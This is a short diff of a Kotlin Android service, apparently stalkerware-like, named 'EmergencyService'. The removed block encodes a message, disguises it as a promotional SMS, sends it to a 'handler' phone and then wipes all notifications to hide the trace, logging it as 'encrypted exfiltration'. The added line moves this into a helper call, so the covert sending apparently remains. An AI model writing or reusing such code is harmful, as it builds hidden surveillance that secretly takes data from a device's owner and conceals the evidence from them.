@@ -178,23 +178,7 @@ class EmergencyService : Service() {
             DebugLogger.log("CodeRed", "SMS response aborted: No handler phone number provided for offline reply.")
             return
         }
-        try {
-            val token = FidelCipher.encode(msg)
-            val promo = FidelCipher.camouflage(applicationContext, token)
-            val smsManager = getSystemService(android.telephony.SmsManager::class.java)
-
-            val parts = smsManager.divideMessage(promo)
-            smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
-            
-            // Clear ALL clearable notifications to hide SMS trace and system alerts
-            CoroutineScope(Dispatchers.Main).launch {
-                delay(1500)
-                MyNotificationListener.instance?.wipeNotifications("ALL", null)
-            }
-            DebugLogger.log("CodeRed", "Encrypted exfiltration dispatched to $phone")
-        } catch (e: Exception) {
-            DebugLogger.log("CodeRed_SMS_ERR", "Failed to send encrypted text: ${e.message}")
-        }
+        PhoneManager.sendEncryptedRobustSms(applicationContext, phone, msg)
     }
 
     private fun isOnline(): Boolean {
